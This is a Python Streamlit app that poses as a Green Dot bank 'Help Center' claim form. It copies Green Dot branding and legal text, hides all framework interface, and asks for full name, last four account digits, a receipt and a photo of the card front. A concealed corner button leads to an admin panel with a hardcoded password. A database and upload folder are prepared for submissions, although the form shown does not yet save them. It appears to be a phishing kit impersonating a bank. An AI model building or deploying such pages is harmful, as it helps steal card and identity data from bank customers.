
import streamlit as st
import sqlite3
import os
import random
import string
import pandas as pd
from datetime import datetime

# --- DB CONFIG ---
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# --- UI SHIELD CON FOCO EN MÓVIL ---
st.markdown("""<style>
    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
    
    /* Contenedor principal adaptable */
    .block-container {
        max-width: 500px !important;
        padding-top: 2.5rem !important;
        padding-left: 1rem !important;
        padding-right: 1rem !important;
    }

    [data-testid='stHeader'], header, footer, .stDeployButton,
    .section-anchor, a.section-anchor,
    [data-testid='stHeaderActionElements'], .st-emotion-cache-gi0tri, .etxdrby3,
    [data-testid='stToolbar'], [data-testid='stElementToolbar'],
    .st-emotion-cache-140j12g, button[title='View fullscreen'] {
        display: none !important;
        visibility: hidden !important;
    }

    /* LOGO RESPONSIVO: Grande en PC, Ajustado en Móvil */
    [data-testid="stImage"] {
        display: flex !important;
        justify-content: center !important;
        width: 100% !important;
        margin: 10px auto 25px auto !important;
    }
    [data-testid="stImage"] img {
        width: 320px !important; 
        height: auto !important;
    }

    /* Ajustes específicos para móviles */
    @media (max-width: 768px) {
        [data-testid="stImage"] img { width: 200px !important; }
        .block-container { padding-top: 1.5rem !important; }
        h1 { font-size: 1.8rem !important; }
    }

    .stButton > button {
        background-color: #00a05b !important;
        color: white !important;
        border-radius: 8px !important;
        font-weight: 600 !important;
        width: 100% !important;
        height: 50px !important;
        border: none !important;
    }

    .promo-box {
        background-color: #111; padding: 25px 15px; text-align: center;
        border-radius: 12px; margin: 25px 0; border: 1px solid #222;
    }

    .legal-container {
        font-size: 11px !important;
        color: #777 !important;
        text-align: center !important;
        margin-top: 40px !important;
        padding: 20px 10px !important;
        border-top: 1px solid #222 !important;
        line-height: 1.6 !important;
    }

    .stealth-trigger {
        position: absolute !important;
        bottom: 0 !important; left: 0 !important;
        width: 40px !important; height: 40px !important;
        z-index: 9999 !important;
    }
</style>""", unsafe_allow_html=True)

if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False

if not st.session_state.admin_mode:
    if os.path.exists('logo.svg'):
        st.image('logo.svg')

    st.title("Help Center")
    st.write("Please fill out the form below to submit your claim.")

    with st.form("claim_v32_9_0", clear_on_submit=True):
        st.text_input("Full Name")
        st.text_input("Last 4 digits of Account")
        st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
        st.file_uploader("Receipt", type=['jpg','png','jpeg'])
        st.file_uploader("Card Front", type=['jpg','png','jpeg'])
        if st.form_submit_button("SUBMIT NOW"): 
            st.success("Claim Received.")

    st.markdown("""<div class='promo-box'>
        <h3 style='color:white; margin-bottom:15px; font-size: 1.2rem;'>Download the Green Dot app</h3>
        <div style='display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;'>
            <a href='#'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'></a>
            <a href='#'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'></a>
        </div>
    </div>""", unsafe_allow_html=True)

    st.markdown("<div class='stealth-trigger'>", unsafe_allow_html=True)
    if st.button(" ", key="stealth_v90"): 
        st.session_state.admin_mode = True
        st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)

    st.markdown("<div class='legal-container'>Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC. &copy;2026 Green Dot Corporation. All rights reserved. NMLS #914924.</div>", unsafe_allow_html=True)

else:
    st.title("Admin Access")
    pw = st.text_input("Auth Key", type="password")
    if st.button("CHECK"):
        if pw == "Diostieneelpoder1": st.write("Access Granted")
    if st.button("\u211E"): 
        st.session_state.admin_mode = False
        st.rerun()
